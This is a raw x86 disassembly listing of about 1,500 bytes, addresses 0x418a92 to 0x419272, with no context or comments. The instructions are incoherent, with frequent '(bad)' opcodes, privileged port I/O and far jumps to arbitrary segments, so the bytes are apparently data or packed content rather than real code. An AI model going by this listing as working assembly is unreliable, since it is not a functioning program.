  418a92:	add    DWORD PTR [esi+0x77],0x2f
  418a96:	in     eax,0x29
  418a98:	mov    al,ds:0x2fd033c
  418a9d:	jns    0x418ae7
  418a9f:	push   ecx
  418aa0:	in     eax,0xb
  418aa2:	loopne 0x418af9
  418aa4:	xchg   edx,eax
  418aa5:	mov    dh,0x99
  418aa7:	push   eax
  418aa8:	loopne 0x418a47
  418aaa:	mov    ds:0x9af20783,eax
  418aaf:	int3   
  418ab0:	daa    
  418ab1:	imul   edi,DWORD PTR [esi],0xdbc54a96
  418ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab8:	(bad)  
  418ab9:	scas   al,BYTE PTR es:[edi]
  418aba:	mov    BYTE PTR [edx],ch
  418abc:	cmc    
  418abd:	aas    
  418abe:	or     DWORD PTR ds:0x71fa8ab2,0xffffffcb
  418ac5:	push   cs
  418ac6:	push   esi
  418ac7:	push   edx
  418ac8:	lea    ecx,[ebx]
  418aca:	out    0x8b,al
  418acc:	cli    
  418acd:	pusha  
  418ace:	or     esp,esi
  418ad0:	and    al,0x28
  418ad2:	popf   
  418ad3:	lds    esi,FWORD PTR [eax+eax*1+0x68e20f83]
  418ada:	loopne 0x418adf
  418adc:	cmp    al,0x2
  418ade:	(bad)  
  418ae0:	push   ds
  418ae1:	sti    
  418ae2:	call   0xac93:0x30ae6000
  418ae9:	dec    edx
  418aea:	or     eax,DWORD PTR [esi*4+0x11fa1679]
  418af1:	dec    esi
  418af2:	xchg   BYTE PTR [esi-0x75],bh
  418af5:	pop    ds
  418af6:	cli    
  418af7:	adc    eax,0x7dfc2d3a
  418afc:	out    dx,al
  418afd:	or     ebp,DWORD PTR [edi]
  418aff:	out    0x1b,al
  418b01:	add    eax,0x39b260d0
  418b06:	adc    DWORD PTR [esi-0x70],edi
  418b09:	sbb    bh,bl
  418b0b:	nop
  418b0c:	or     BYTE PTR [ebx],cl
  418b0e:	jmp    0x3c74:0xda4f5cb3
  418b15:	(bad)  
  418b16:	fwait
  418b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b18:	inc    esi
  418b19:	xor    al,0x1b
  418b1b:	pop    ecx
  418b1c:	bound  edx,QWORD PTR [ecx+0xc255156]
  418b22:	test   DWORD PTR [ebx-0x46],0xaaf74c56
  418b29:	push   ecx
  418b2a:	stos   BYTE PTR es:[edi],al
  418b2b:	adc    eax,0x89b4d7c1
  418b30:	pop    ss
  418b31:	ret    0x879f
  418b34:	nop
  418b35:	add    al,0x1d
  418b37:	xor    esp,DWORD PTR [edx-0x4e1dfaf2]
  418b3d:	or     ebp,DWORD PTR [ebp+ebx*4+0x784385e3]
  418b44:	mov    esp,DWORD PTR [ebp-0x66]
  418b47:	fcmovb st,st(4)
  418b49:	inc    ebp
  418b4a:	sub    BYTE PTR [edi],ah
  418b4c:	jne    0x418b54
  418b4e:	push   ebp
  418b4f:	aad    0x99
  418b51:	add    eax,0x67df0bad
  418b56:	cli    
  418b57:	test   eax,0x36935159
  418b5c:	shr    DWORD PTR [edi-0x14],0x52
  418b60:	xchg   esp,eax
  418b61:	push   ds
  418b62:	cmp    eax,0x6a52b203
  418b67:	jmp    0x418b6f
  418b69:	rol    DWORD PTR [ebp-0x59],cl
  418b6c:	and    BYTE PTR [ecx+edx*1-0x7355fb40],dl
  418b73:	fs mov dl,0x4a
  418b76:	in     al,dx
  418b77:	dec    ebp
  418b78:	push   ebx
  418b79:	xchg   ebp,eax
  418b7a:	out    0xa5,eax
  418b7c:	fisttp QWORD PTR [ebx]
  418b7e:	adc    al,0xbd
  418b80:	addr16 pop esi
  418b82:	inc    edi
  418b83:	outs   dx,BYTE PTR ds:[esi]
  418b84:	and    al,0xa4
  418b86:	call   0x74b7:0x137359d0
  418b8d:	clc    
  418b8e:	mov    ebp,0x46573ea7
  418b93:	pop    ds
  418b94:	es mov eax,0x2fb2e5e1
  418b9a:	lock loop 0x418bb4
  418b9d:	mov    al,ds:0xbdce744
  418ba2:	jnp    0x418bdf
  418ba4:	cdq    
  418ba5:	test   DWORD PTR [ecx],eax
  418ba7:	jno    0x418b50
  418ba9:	neg    DWORD PTR [ebp-0x33ac82d]
  418baf:	es inc ecx
  418bb1:	sbb    al,0x86
  418bb3:	aas    
  418bb4:	dec    esp
  418bb5:	aaa    
  418bb6:	stos   DWORD PTR es:[edi],eax
  418bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb8:	xchg   esi,eax
  418bb9:	pop    ebp
  418bba:	hlt    
  418bbb:	in     eax,dx
  418bbc:	ret    
  418bbd:	inc    edi
  418bbe:	jnp    0x418bfc
  418bc0:	push   edx
  418bc1:	sbb    eax,0x3981ca9d
  418bc6:	ss das 
  418bc8:	and    dh,BYTE PTR [ebp+edx*8+0x5508dc42]
  418bcf:	mov    ecx,0x594325a9
  418bd4:	imul   edi,DWORD PTR [ebx],0xffffffb3
  418bd7:	out    0x29,eax
  418bd9:	mov    ds,WORD PTR [esi-0x66374c22]
  418bdf:	pop    ds
  418be0:	adc    cl,BYTE PTR [esi+0x8]
  418be3:	dec    ebp
  418be4:	dec    dx
  418be6:	lds    esp,FWORD PTR [eax-0x44f4f2d1]
  418bec:	inc    ecx
  418bed:	mov    ebx,0xe703d0aa
  418bf2:	fwait
  418bf3:	xchg   esp,eax
  418bf4:	mov    dh,0x83
  418bf6:	sbb    eax,0x6e20f999
  418bfb:	int    0x77
  418bfd:	ss pop edx
  418bff:	xor    BYTE PTR [edx],0x7c
  418c02:	ja     0x418be0
  418c04:	(bad)  
  418c05:	retf   0xe328
  418c08:	mov    dl,0x97
  418c0a:	mov    ah,BYTE PTR [edx]
  418c0c:	clc    
  418c0d:	xchg   esp,eax
  418c0e:	ins    DWORD PTR es:[edi],dx
  418c0f:	add    eax,0xd0b00b6c
  418c14:	xchg   edx,eax
  418c15:	mov    al,ds:0xf678c5b3
  418c1a:	call   0x6531:0xbb2c512c
  418c21:	adc    BYTE PTR [ecx+0x2dd9d9bb],bh
  418c27:	daa    
  418c28:	push   cs
  418c29:	retf   0xaad
  418c2c:	sbb    eax,0x5b7b9aa8
  418c31:	and    al,0x28
  418c33:	repz mov eax,ds:0xe5a74e97
  418c39:	adc    eax,0xe530daa9
  418c3e:	lods   al,BYTE PTR ds:[esi]
  418c3f:	fbstp  TBYTE PTR [edx+0x7ccebb3e]
  418c45:	sub    DWORD PTR [ecx+0x22],edx
  418c48:	or     esi,DWORD PTR [ebx]
  418c4a:	inc    esi
  418c4b:	cdq    
  418c4c:	xor    dh,ah
  418c4e:	mov    al,0x3e
  418c50:	adc    al,0xa7
  418c52:	mov    cl,0x9e
  418c54:	lds    esi,FWORD PTR [ecx]
  418c56:	call   0x3716:0x1cecc1a0
  418c5d:	or     BYTE PTR [edi+eiz*4],al
  418c60:	daa    
  418c61:	leave  
  418c62:	dec    edi
  418c63:	xchg   ecx,esi
  418c65:	mov    al,ds:0xdfb2488a
  418c6a:	push   eax
  418c6b:	add    DWORD PTR [edi+0x58],edx
  418c6e:	mov    dh,0xaf
  418c70:	clc    
  418c71:	or     edi,DWORD PTR [ecx+0x61]
  418c74:	ss inc esi
  418c76:	out    0xf8,al
  418c78:	and    al,0x45
  418c7a:	call   0x5271:0x96a1ae69
  418c81:	mov    es,WORD PTR [ebx]
  418c83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c84:	jmp    0x1d7b:0xa4bc786d
  418c8b:	jmp    0xaa02:0x4c5be2b2
  418c92:	dec    edi
  418c93:	ins    BYTE PTR es:[edi],dx
  418c94:	xchg   ecx,eax
  418c95:	or     ecx,DWORD PTR [edx+edx*8-0x34]
  418c99:	add    DWORD PTR [eax-0x65c9fc48],eax
  418c9f:	jae    0x418ceb
  418ca1:	add    BYTE PTR [edx-0x4559f1ab],0xa7
  418ca8:	dec    eax
  418ca9:	xchg   ecx,ecx
  418cab:	lea    eax,[edi]
  418cad:	cmp    eax,0x4f0215e9
  418cb2:	(bad)  
  418cb3:	in     eax,dx
  418cb4:	mov    dl,0x1a
  418cb6:	cld    
  418cb7:	xchg   edi,eax
  418cb8:	sar    ah,1
  418cba:	int3   
  418cbb:	inc    edx
  418cbc:	scas   eax,DWORD PTR es:[edi]
  418cbd:	or     edx,ebp
  418cbf:	xchg   ecx,eax
  418cc0:	lods   al,BYTE PTR ds:[esi]
  418cc1:	shl    BYTE PTR [esi-0x6e],cl
  418cc4:	pop    edx
  418cc5:	out    0x9a,al
  418cc7:	sbb    ecx,0xffffffa1
  418cca:	push   eax
  418ccb:	push   ecx
  418ccc:	cmp    ecx,DWORD PTR [edi+0xd]
  418ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cd0:	xlat   BYTE PTR ds:[ebx]
  418cd1:	in     eax,dx
  418cd2:	cmp    DWORD PTR [ebp+0x572e0889],ebx
  418cd8:	mov    dl,0x98
  418cda:	(bad)  
  418cdb:	push   0x65cfb779
  418ce0:	jmp    0xe98f:0x753d0b
  418ce7:	sub    eax,DWORD PTR [edi+ebp*1+0x1cccf4e1]
  418cee:	call   0x62bf:0x32210442
  418cf5:	dec    ecx
  418cf6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cf8:	stc    
  418cf9:	mov    edx,0x14d8263f
  418cfe:	scas   eax,DWORD PTR es:[edi]
  418cff:	addr16 mov dl,0x95
  418d02:	cld    
  418d03:	ret    0x63ba
  418d06:	hlt    
  418d07:	ds xor ax,0xb3ae
  418d0c:	xor    ch,BYTE PTR [ebx-0x29892b38]
  418d12:	add    cl,BYTE PTR [ebx+0x23f8c2b2]
  418d18:	push   eax
  418d19:	pop    ebp
  418d1a:	cmp    dh,bl
  418d1c:	pop    esi
  418d1d:	jb     0x418d4d
  418d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d20:	mov    ds:0x141cd2b1,al
  418d25:	repz sub BYTE PTR [esi-0x5882d416],0x1c
  418d2d:	outs   dx,DWORD PTR ds:[esi]
  418d2e:	jg     0x418cc1
  418d30:	add    ch,bh
  418d32:	loop   0x418cdb
  418d34:	stc    
  418d35:	adc    cl,BYTE PTR [eax]
  418d37:	mov    bl,0x58
  418d39:	test   DWORD PTR [edx+0x32],edx
  418d3c:	mov    dl,0x97
  418d3e:	popa   
  418d3f:	adc    cl,BYTE PTR ds:[eax+0xb43e93c]
  418d46:	and    ecx,DWORD PTR [edx]
  418d48:	sahf   
  418d49:	ja     0x418dae
  418d4b:	jmp    0x1cb:0x659a5163
  418d52:	test   eax,0x7d5d936e
  418d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d58:	xlat   BYTE PTR ds:[ebx]
  418d59:	out    0x62,eax
  418d5b:	call   FWORD PTR [edx+0x3a]
  418d5e:	and    ch,BYTE PTR [ebx-0x5fc4334f]
  418d64:	(bad)  
  418d65:	push   esi
  418d66:	and    al,0xf
  418d68:	mov    bl,0xea
  418d6a:	js     0x418d24
  418d6c:	pop    ebp
  418d6d:	pop    esi
  418d6e:	mov    esp,DWORD PTR [edi-0x2fdcfd12]
  418d74:	adc    al,0xe5
  418d76:	popf   
  418d77:	lock push edx
  418d79:	cwde   
  418d7a:	(bad)  
  418d7b:	shl    ecx,0xc4
  418d7e:	or     BYTE PTR [edi],dl
  418d80:	mov    ah,0x7e
  418d82:	and    eax,0x93fbb6a8
  418d87:	loopne 0x418d1c
  418d89:	ins    BYTE PTR es:[edi],dx
  418d8a:	ja     0x418d77
  418d8c:	in     eax,0xc6
  418d8e:	pop    esi
  418d8f:	arpl   ax,bp
  418d91:	fstp   QWORD PTR [edx+0x7168c446]
  418d97:	aaa    
  418d98:	add    eax,0xda7d7eb
  418d9d:	mov    bh,0xdd
  418d9f:	jl     0x418d5b
  418da1:	lahf   
  418da2:	add    BYTE PTR [ebx+esi*4+0x48],dl
  418da6:	pop    es
  418da7:	sub    bl,ah
  418da9:	loop   0x418db8
  418dab:	push   ecx
  418dac:	inc    esi
  418dad:	sbb    BYTE PTR [ebx-0x38a67c59],al
  418db3:	mov    al,0xf4
  418db5:	pusha  
  418db6:	mov    dh,0xb8
  418db8:	scas   al,BYTE PTR es:[edi]
  418db9:	or     esi,esi
  418dbb:	(bad)  
  418dbc:	mov    dl,0x2f
  418dbe:	mov    eax,0xad4c60f3
  418dc3:	push   edi
  418dc4:	dec    ebx
  418dc5:	add    al,0x6c
  418dc7:	add    eax,0x2eda03f9
  418dcc:	sbb    BYTE PTR [ecx+0x9b26231],0xd5
  418dd3:	jmp    0x418dcf
  418dd5:	mov    ah,0x9d
  418dd7:	inc    ebp
  418dd8:	xor    DWORD PTR [edx+edx*2],esi
  418ddb:	xlat   BYTE PTR ds:[ebx]
  418ddc:	xor    cl,bh
  418dde:	xlat   BYTE PTR ds:[ebx]
  418ddf:	and    BYTE PTR [ebx+ebx*1-0x1a],0x7e
  418de4:	mov    dl,0x50
  418de6:	jb     0x418e24
  418de8:	xchg   esi,eax
  418de9:	or     DWORD PTR [ebp+0x250c9136],edx
  418def:	fcmovu st,st(2)
  418df1:	cmp    BYTE PTR [edi+eax*2],cl
  418df4:	xchg   ebx,eax
  418df5:	jmp    0x418e10
  418df7:	sub    esi,DWORD PTR [edx+0x66024412]
  418dfd:	sbb    BYTE PTR [ecx+ebx*8+0x412b0ba4],dl
  418e04:	dec    ecx
  418e05:	adc    al,0xea
  418e07:	sub    edi,edi
  418e09:	hlt    
  418e0a:	test   DWORD PTR [ecx-0x1e],esi
  418e0d:	sbb    ebx,DWORD PTR [ecx+0x27d900bd]
  418e13:	jle    0x418e21
  418e15:	dec    esp
  418e16:	outs   dx,BYTE PTR ds:[esi]
  418e17:	pushf  
  418e18:	inc    edx
  418e19:	or     edx,DWORD PTR [ecx+0x5b]
  418e1c:	clc    
  418e1d:	dec    ecx
  418e1e:	lds    ebp,FWORD PTR [ecx+ecx*2]
  418e21:	jg     0x418dbb
  418e23:	or     BYTE PTR [esi],ch
  418e25:	and    eax,0xcb53fdfa
  418e2a:	shl    BYTE PTR [esi+0x3b],1
  418e2d:	add    BYTE PTR [ebx+0x1aabba68],ch
  418e33:	out    dx,eax
  418e34:	cmp    BYTE PTR ds:0xcab2090e,0x63
  418e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3c:	popa   
  418e3d:	lods   eax,DWORD PTR ds:[esi]
  418e3e:	or     dl,bl
  418e40:	push   ebx
  418e41:	or     bh,BYTE PTR [edi+0x1f]
  418e44:	fcmovne st,st(0)
  418e46:	or     esp,0xacf5e387
  418e4c:	pushf  
  418e4d:	aad    0x61
  418e4f:	inc    ecx
  418e50:	mov    dl,0x79
  418e52:	fisttp QWORD PTR [ebx+0x12]
  418e55:	adc    esp,DWORD PTR [edi+eiz*4+0xc14e62d]
  418e5c:	jecxz  0x418e39
  418e5e:	mov    ecx,gs
  418e60:	mov    dl,0x43
  418e62:	push   eax
  418e63:	mov    ebp,0x4e9b6783
  418e68:	pop    ebp
  418e69:	or     eax,DWORD PTR [edi]
  418e6b:	adc    eax,0x5ff03418
  418e70:	lds    edx,FWORD PTR [ebx-0x68]
  418e73:	add    ch,BYTE PTR [edx]
  418e75:	(bad)  
  418e76:	dec    edi
  418e77:	call   0x84ef:0x300e8bbe
  418e7e:	jns    0x418e20
  418e80:	pop    ebp
  418e81:	mov    edi,0x7b8ed851
  418e86:	sbb    al,0xbb
  418e88:	pop    edx
  418e89:	sahf   
  418e8a:	call   0xf6c9:0x53133a8f
  418e91:	nop
  418e92:	push   0xffffffa7
  418e94:	adc    al,0x42
  418e96:	rcl    BYTE PTR [eax],0x59
  418e99:	mov    dh,0x92
  418e9b:	mov    dh,0xb2
  418e9d:	lods   al,BYTE PTR ds:[esi]
  418e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e9f:	and    ebp,DWORD PTR ds:0x5787b32f
  418ea5:	or     ebx,DWORD PTR [ebx-0x39]
  418ea8:	mov    dh,0x9e
  418eaa:	test   DWORD PTR [eax],ecx
  418eac:	sub    al,0x91
  418eae:	call   0xc92b:0x6eb64195
  418eb5:	and    cl,dl
  418eb7:	inc    edi
  418eb8:	mov    esi,0x72a7d29b
  418ebd:	pop    edi
  418ebe:	fild   WORD PTR [esi+edx*4-0x3b]
  418ec2:	pop    edi
  418ec3:	jp     0x418e77
  418ec5:	fcomp  QWORD PTR [ebp-0x548be0d9]
  418ecb:	ret    0xb7a
  418ece:	push   edi
  418ecf:	mov    bl,0x4f
  418ed1:	sub    eax,0x83d62153
  418ed6:	call   0x6dc1:0xe2d586ed
  418edd:	cmp    DWORD PTR [ecx+0x56],edx
  418ee0:	dec    esi
  418ee1:	sti    
  418ee2:	ss dec ebx
  418ee4:	aaa    
  418ee5:	or     BYTE PTR [esi+0xa],al
  418ee8:	jmp    0x7b789479
  418eed:	pop    ds
  418eee:	dec    ebp
  418eef:	dec    ebx
  418ef0:	or     edx,DWORD PTR [ecx+ebx*4+0x10]
  418ef4:	jbe    0x418ef0
  418ef6:	retf   0xc54e
  418ef9:	xchg   edx,eax
  418efa:	mov    bh,0xbd
  418efc:	dec    edi
  418efd:	mov    al,ds:0xb6b4046
  418f02:	cmp    eax,DWORD PTR [edx]
  418f04:	into   
  418f05:	js     0x418f62
  418f07:	ficom  WORD PTR [eax+edx*4]
  418f0a:	call   0x7c43:0x506c31d6
  418f11:	and    dl,cl
  418f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f14:	aas    
  418f15:	repz mov dh,0xc4
  418f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f19:	mov    al,0x45
  418f1b:	xor    ch,BYTE PTR [esi-0x75a8f12d]
  418f21:	or     ecx,edi
  418f23:	jecxz  0x418f76
  418f25:	ins    DWORD PTR es:[edi],dx
  418f26:	popf   
  418f27:	adc    ebx,DWORD PTR [ebx+ecx*1+0x24]
  418f2b:	push   ss
  418f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f2d:	xchg   esi,eax
  418f2e:	inc    ebp
  418f2f:	test   DWORD PTR [ebp-0x4bfa6534],ebx
  418f35:	mov    ?,WORD PTR [ebx]
  418f37:	jge    0x418f83
  418f39:	xchg   edi,eax
  418f3a:	jg     0x418ee3
  418f3c:	neg    BYTE PTR [edi]
  418f3e:	inc    edi
  418f3f:	inc    esi
  418f40:	xchg   dh,ah
  418f42:	retf   
  418f43:	sub    BYTE PTR [edx+0xcb4d22b],dh
  418f49:	xor    BYTE PTR [esi],cl
  418f4b:	cmp    edx,DWORD PTR [edx+ecx*1]
  418f4e:	inc    esi
  418f4f:	sub    ecx,DWORD PTR [edx]
  418f51:	cdq    
  418f52:	xor    dl,al
  418f54:	or     edi,edi
  418f56:	test   DWORD PTR [edx+esi*4+0x7d19577],0xf2eac66c
  418f61:	or     ebp,DWORD PTR [eax]
  418f63:	(bad)  
  418f64:	and    DWORD PTR [esi-0x11f91f5d],esi
  418f6a:	call   0x425b:0xa29a55c
  418f71:	mov    ch,0xad
  418f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f74:	add    ch,BYTE PTR [edi-0xb08201a]
  418f7a:	pop    esp
  418f7b:	xor    esi,DWORD PTR [ecx-0xe43513c]
  418f81:	imul   esp,DWORD PTR ds:0xb0cbb54d,0xc90b6c16
  418f8b:	cs iret 
  418f8d:	sub    eax,0x22874311
  418f92:	call   0xf206:0x41c92437
  418f99:	jge    0x418fde
  418f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f9c:	sub    ecx,eax
  418f9e:	cmp    ecx,ebx
  418fa0:	push   edi
  418fa1:	bswap  ebp
  418fa3:	add    ah,BYTE PTR cs:[edx]
  418fa6:	call   0x5f77:0x50548122
  418fad:	shl    BYTE PTR [esi-0x58],1
  418fb0:	pop    esi
  418fb1:	sub    DWORD PTR [ebx-0x2e],ecx
  418fb4:	adc    esp,esp
  418fb6:	jns    0x418fbd
  418fb8:	push   ss
  418fb9:	(bad)  
  418fba:	clc    
  418fbb:	dec    ecx
  418fbc:	mov    dl,0x3a
  418fbe:	retf   0x442f
  418fc1:	mov    BYTE PTR [edi+0x290b4c4a],dl
  418fc7:	pushf  
  418fc8:	shl    edi,0x1d
  418fcb:	sub    ebp,DWORD PTR [edx+0x23]
  418fce:	call   0x20f6:0x8bcf9037
  418fd5:	mov    ds:0x2439a7d9,al
  418fda:	sub    al,0xf9
  418fdc:	pop    ss
  418fdd:	or     ch,dl
  418fdf:	jl     0x418f93
  418fe1:	shl    DWORD PTR [ebx+0x57],0x3
  418fe5:	jnp    0x418fcc
  418fe7:	and    esi,DWORD PTR [edx+0xb]
  418fea:	sbb    BYTE PTR [ebx],bh
  418fec:	loop   0x418f92
  418fee:	getsec 
  418ff0:	stos   BYTE PTR es:[edi],al
  418ff1:	neg    BYTE PTR [ecx-0x78b1d048]
  418ff7:	xor    eax,0x4e84bb7b
  418ffc:	dec    ecx
  418ffd:	or     ebp,ecx
  418fff:	test   DWORD PTR [edi+0x5626e348],0xb94a68b0
  419009:	sar    ch,cl
  41900b:	out    dx,eax
  41900c:	aaa    
  41900d:	or     ebp,ecx
  41900f:	add    cl,bl
  419011:	retf   0xa7c3
  419014:	and    edi,DWORD PTR [ecx+ecx*4+0x689de78a]
  41901b:	add    DWORD PTR [edx+0x59c81043],esi
  419021:	xchg   DWORD PTR [ebp+0x7c],esi
  419024:	repnz or al,0xf6
  419027:	or     DWORD PTR [eax-0x49],0x1205e7a8
  41902e:	lods   eax,DWORD PTR ds:[esi]
  41902f:	add    BYTE PTR [edx+0x52bbbe27],dh
  419035:	mov    esi,0xbdd4964
  41903a:	mov    WORD PTR [esi+eiz*2+0x4d985e67],fs
  419041:	xchg   ebp,eax
  419042:	call   0xb49e:0x61ffffd6
  419049:	mov    bl,0x34
  41904b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41904c:	mov    ebx,0x8607f866
  419051:	sbb    al,0xf6
  419053:	pop    eax
  419054:	scas   al,BYTE PTR es:[edi]
  419055:	bound  edx,QWORD PTR [eax]
  419057:	inc    edi
  419058:	int3   
  419059:	or     ecx,edi
  41905b:	aam    0xf5
  41905d:	jmp    0x8a2b2c0
  419062:	in     eax,0x6
  419064:	imul   eax,DWORD PTR [edx+ebx*1],0xffffff8f
  419068:	dec    ebx
  419069:	(bad)  
  41906a:	call   0x9b34f036
  41906f:	push   ebp
  419070:	or     BYTE PTR [ecx-0x7da41dd7],0xb6
  419077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419078:	dec    esp
  419079:	(bad)  
  41907a:	iret   
  41907b:	cwde   
  41907c:	leave  
  41907d:	xchg   esi,eax
  41907e:	push   0x29
  419080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419081:	push   ss
  419082:	xchg   DWORD PTR [ebp+edx*2-0x61926558],ebp
  419089:	and    dl,BYTE PTR [ebx]
  41908b:	repz bound ecx,QWORD PTR [ebx]
  41908e:	mov    bh,0xc0
  419090:	xchg   ebp,edx
  419092:	cld    
  419093:	loop   0x419048
  419095:	or     eax,0x777259a5
  41909a:	call   0x96a2:0x70d2c80f
  4190a1:	imul   esp,DWORD PTR ds:0x207ee2a7,0x2e
  4190a8:	jnp    0x4190e0
  4190aa:	sti    
  4190ab:	popa   
  4190ac:	mov    dl,0xa8
  4190ae:	es pop esp
  4190b0:	(bad)  
  4190b2:	leave  
  4190b3:	imul   eax,eax,0xb
  4190b6:	add    al,0xdd
  4190b8:	adc    al,0xdf
  4190ba:	sub    ah,BYTE PTR [edx-0xd620d0a]
  4190c0:	dec    ebp
  4190c1:	jecxz  0x4190aa
  4190c3:	push   eax
  4190c4:	adc    dl,ah
  4190c6:	sub    DWORD PTR [esi+0x6a],eax
  4190c9:	or     ch,BYTE PTR [edi-0x7b]
  4190cc:	mov    ds:0xe4701e19,al
  4190d1:	xlat   BYTE PTR ds:[ebx]
  4190d2:	jmp    0x3b72:0xd3b2b2ab
  4190d9:	lods   eax,DWORD PTR ds:[esi]
  4190da:	shl    BYTE PTR [ebx+0x15],1
  4190dd:	or     edi,ecx
  4190df:	xchg   ebp,eax
  4190e0:	and    dl,BYTE PTR [ebp+0x30]
  4190e3:	(bad)  
  4190e4:	mov    bl,0xed
  4190e6:	xchg   esp,eax
  4190e7:	mov    ecx,edx
  4190e9:	mov    eax,0x2a8247cd
  4190ee:	aad    0x99
  4190f0:	nop
  4190f1:	or     esp,DWORD PTR [edx-0xec827c9]
  4190f7:	mov    ebx,0x2b9a5546
  4190fc:	repz sub eax,0xb8a7d749
  419102:	retf   0x2da7
  419105:	pop    ds
  419106:	and    WORD PTR [ebx-0x4d65308d],bx
  41910d:	sub    ecx,DWORD PTR [edi]
  41910f:	dec    edi
  419110:	mov    dh,0x12
  419112:	daa    
  419113:	jge    0x4190de
  419115:	jb     0x419129
  419117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419118:	call   0x7b351554
  41911d:	add    dh,dl
  41911f:	inc    ebp
  419120:	mov    dl,0x92
  419122:	jnp    0x419184
  419124:	pushf  
  419125:	mov    ecx,0x4c0b6558
  41912b:	rcl    DWORD PTR ds:0xa46fe297,0x28
  419132:	call   0x5036:0x36eec323
  419139:	pop    eax
  41913a:	ret    0xfeb9
  41913d:	fsub   QWORD PTR [ebx+ebx*8]
  419140:	mov    dl,0x8d
  419142:	repz jg 0x4191c1
  419145:	ja     0x4190c8
  419147:	cwde   
  419148:	pop    ebx
  419149:	imul   ecx,ebx,0xffffffc8
  41914c:	mov    BYTE PTR [ecx+ebx*2+0x5045a2a7],al
  419153:	dec    esp
  419154:	mov    edi,0xe4a47fa8
  419159:	jmp    0x8d120087
  41915e:	and    bl,BYTE PTR [ebp-0x2d]
  419161:	jns    0x419107
  419163:	add    bl,BYTE PTR [ebp-0x76]
  419166:	imul   esp,DWORD PTR ds:0x62dbe61e,0xa72b4966
  419170:	push   esi
  419171:	addr16 int3 
  419173:	pushf  
  419174:	out    0x7a,al
  419176:	cwde   
  419177:	xchg   edx,eax
  419178:	mov    dl,0x66
  41917a:	iret   
  41917b:	add    ch,al
  41917d:	(bad)  
  41917e:	cmp    al,0xcd
  419180:	fsubr  st(1),st
  419182:	sbb    esp,DWORD PTR [eax+0x76f13839]
  419188:	cmp    eax,0x40ffd5eb
  41918d:	fadd   st(6),st
  41918f:	lods   al,BYTE PTR ds:[esi]
  419190:	in     al,dx
  419191:	or     ebx,DWORD PTR [esi-0x793ffaa7]
  419197:	mov    eax,ds:0x578a141e
  41919c:	lods   eax,DWORD PTR ds:[esi]
  41919d:	pop    ecx
  41919e:	push   ebp
  41919f:	pop    ecx
  4191a0:	mov    dl,0x8b
  4191a2:	mov    ebp,0xa3729611
  4191a7:	shl    DWORD PTR [esi+0xb5e1d0b],1
  4191ad:	fistp  WORD PTR [ebp-0x58e42246]
  4191b3:	inc    esp
  4191b4:	outs   dx,DWORD PTR ds:[esi]
  4191b5:	xchg   esp,eax
  4191b6:	inc    esp
  4191b7:	dec    esp
  4191b8:	mov    bl,0xe2
  4191ba:	xor    al,0xbe
  4191bc:	mul    DWORD PTR [edi-0x640df5b6]
  4191c2:	stc    
  4191c3:	mov    eax,ebp
  4191c5:	ror    BYTE PTR [eax-0x68],1
  4191c8:	mov    dl,0x2f
  4191ca:	in     al,dx
  4191cb:	repnz cdq 
  4191cd:	rcr    DWORD PTR [eax+0x39],1
  4191d0:	mov    dl,0xe4
  4191d2:	mov    eax,0x2671d1d3
  4191d7:	cli    
  4191d8:	push   0xb
  4191da:	int    0xdc
  4191dc:	mov    al,0x50
  4191de:	xlat   BYTE PTR ds:[ebx]
  4191df:	jge    0x4191d4
  4191e1:	sub    eax,DWORD PTR [edi+0x5a45d5ab]
  4191e7:	ins    DWORD PTR es:[edi],dx
  4191e8:	jg     0xbda7251
  4191ee:	loope  0x41923c
  4191f0:	sbb    ecx,DWORD PTR [ebp+0x3f5ee18e]
  4191f6:	popf   
  4191f7:	scas   eax,DWORD PTR es:[edi]
  4191f8:	jmp    0x6b24:0xb2e50e9b
  4191ff:	fiadd  WORD PTR [ebx+0x19a4eb79]
  419205:	push   0xffffff8a
  419207:	sbb    al,0x52
  419209:	shr    DWORD PTR [edx],cl
  41920b:	out    0x3c,eax
  41920d:	retf   0x1199
  419210:	xchg   BYTE PTR [eax],bl
  419212:	inc    ebp
  419213:	mov    ds:0x9dc48b68,al
  419218:	dec    eax
  419219:	(bad)  
  41921a:	outs   dx,BYTE PTR ds:[esi]
  41921b:	and    BYTE PTR [ecx+0x6797d80b],ch
  419221:	jae    0x419290
  419223:	cmp    ecx,edx
  419225:	loop   0x4191ca
  419227:	and    BYTE PTR [ecx+0xc],0x40
  41922b:	cdq    
  41922c:	inc    edi
  41922d:	mov    cl,BYTE PTR [edx+0x411bb8ef]
  419233:	dec    ecx
  419234:	xlat   BYTE PTR ds:[ebx]
  419235:	or     eax,0xebb08eaa
  41923a:	xor    edi,DWORD PTR [ecx-0x4e]
  41923d:	jnp    0x41929f
  41923f:	(bad)  
  419240:	pop    ebx
  419241:	enter  0x99c8,0x23
  419245:	add    BYTE PTR [ecx+0x1a3b2f08],dh
  41924b:	jl     0x4191d4
  41924d:	mov    eax,ds:0x7ab5e210
  419252:	ins    BYTE PTR es:[edi],dx
  419253:	mov    ebp,0xef0a2fc4
  419258:	sub    DWORD PTR [ebp-0x5139584a],esi
  41925e:	mov    edx,0xfb5269d8
  419263:	add    DWORD PTR [eax+0x7b0f1da9],esi
  419269:	adc    eax,edi
  41926b:	mov    DWORD PTR [edi-0x19],0x78fea255
  419272:	sbb    dl,BYTE PTR [edi]
